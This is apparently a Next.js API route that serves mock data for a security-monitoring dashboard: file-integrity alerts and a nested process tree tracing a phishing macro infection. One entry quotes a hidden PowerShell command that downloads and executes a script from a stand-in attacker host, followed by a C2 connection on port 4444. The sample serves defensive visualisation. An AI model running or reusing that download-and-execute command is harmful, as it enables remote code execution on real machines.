import { NextApiRequest, NextApiResponse } from 'next';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  const mockData = {
    detectionVectorTable: [
      { platform: 'Windows', signature: 1500, behavior: 300, network: 100 },
      { platform: 'Linux', signature: 20, behavior: 250, network: 150 }, // Low signature, high behavior/network for Linux
      { platform: 'macOS', signature: 600, behavior: 100, network: 30 },
    ],
    fileIntegrityMonitoringAlerts: [ // No changes specified, keeping as is or can add more realistic paths
      { timestamp: '2023-10-26T14:05:00Z', host: 'WebServer01', file: '/var/www/html/index.php', event: 'Hash Mismatch', severity: 'High' },
      { timestamp: '2023-10-26T14:10:00Z', host: 'DatabaseSrv', file: '/etc/my.cnf', event: 'Permissions Changed', severity: 'Medium' },
      { timestamp: '2023-10-26T14:15:00Z', host: 'UserPC12', file: 'C:\\Windows\\System32\\drivers\\etc\\hosts', event: 'File Modified', severity: 'High' },
    ],
    processTreeAnomalies: [
      {
        timestamp: '2023-10-26T15:00:00Z',
        host: 'Workstation23',
        // ... existing processTreeAnomalies can be removed or kept if used by other parts not in scope
      },
    ],
    processTreeAnomaliesNested: [
      {
        id: "parent1", name: "Outlook.exe (PID: 3456)", timestamp: "2023-11-06T09:15:00Z", user: "victimUser", host: "VICTIM-PC",
        details: "Opened email with subject 'Urgent Invoice Payment'",
        severity: "Informational",
        children: [
          {
            id: "child1_1", name: "WINWORD.EXE (PID: 5678)", timestamp: "2023-11-06T09:15:30Z", user: "victimUser", host: "VICTIM-PC",
            details: "Opened attachment 'invoice_details.docx'",
            severity: "Informational",
            children: [
              {
                id: "child1_1_1", name: "cmd.exe (PID: 1234)", timestamp: "2023-11-06T09:16:05Z", user: "victimUser", host: "VICTIM-PC",
                details: "Launched by WINWORD.EXE (macro execution)",
                severity: "Medium",
                children: [
                  {
                    id: "child1_1_1_1", name: "powershell.exe (PID: 1266)", timestamp: "2023-11-06T09:16:07Z", user: "victimUser", host: "VICTIM-PC",
                    details: "Executing: powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://evil-domain.com/loader.ps1'))\"",
                    severity: "High",
                    children: [
                      {
                        id: "child1_1_1_1_1", name: "suspicious_script.ps1 (via powershell)", timestamp: "2023-11-06T09:16:30Z", user: "victimUser", host: "VICTIM-PC",
                        details: "Downloaded and executed script content from evil-domain.com",
                        severity: "Critical",
                        children: [
                          {
                            id: "child1_1_1_1_1_1", name: "rundll32.exe (PID: 1300)", timestamp: "2023-11-06T09:17:00Z", user: "victimUser", host: "VICTIM-PC",
                            details: "Making outbound C2 connection to 123.45.67.89:4444",
                            severity: "Critical",
                            children: []
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            ]
          }
        ]
      },
      { // Original parent2, kept for variety
        id: "parent2", name: "explorer.exe (PID: 1122)", timestamp: "2023-11-05T11:15:00Z", user: "SYSTEM", host: "SERVER-FS01",
        details: "System process", // No change to this one, just keeping it
        severity: "Informational",
        children: [
          {
            id: "child2_1", name: "svchost.exe (PID: 3344)", timestamp: "2023-11-05T11:15:10Z", user: "SYSTEM", host: "SERVER-FS01",
            details: "Service Host for 'RemoteRegistry'",
            severity: "Low",
            children: []
          }
        ]
      },
      {
        id: "parent3", name: "outlook.exe (PID: 4012)", timestamp: "2023-11-05T12:05:00Z", user: "asmith", host: "LAPTOP-AS",
        details: "Opened email with attachment 'invoice_details.zip'",
        severity: "Informational",
        children: [
          {
            id: "child3_1", name: "rundll32.exe (PID: 4088)", timestamp: "2023-11-05T12:05:45Z", user: "asmith", host: "LAPTOP-AS",
            details: "Executing from ZIP: invoice_details.zip->update.dll,Install",
            severity: "High",
            children: []
          }
        ]
      }
    ]
  };
  res.status(200).json(mockData);
}
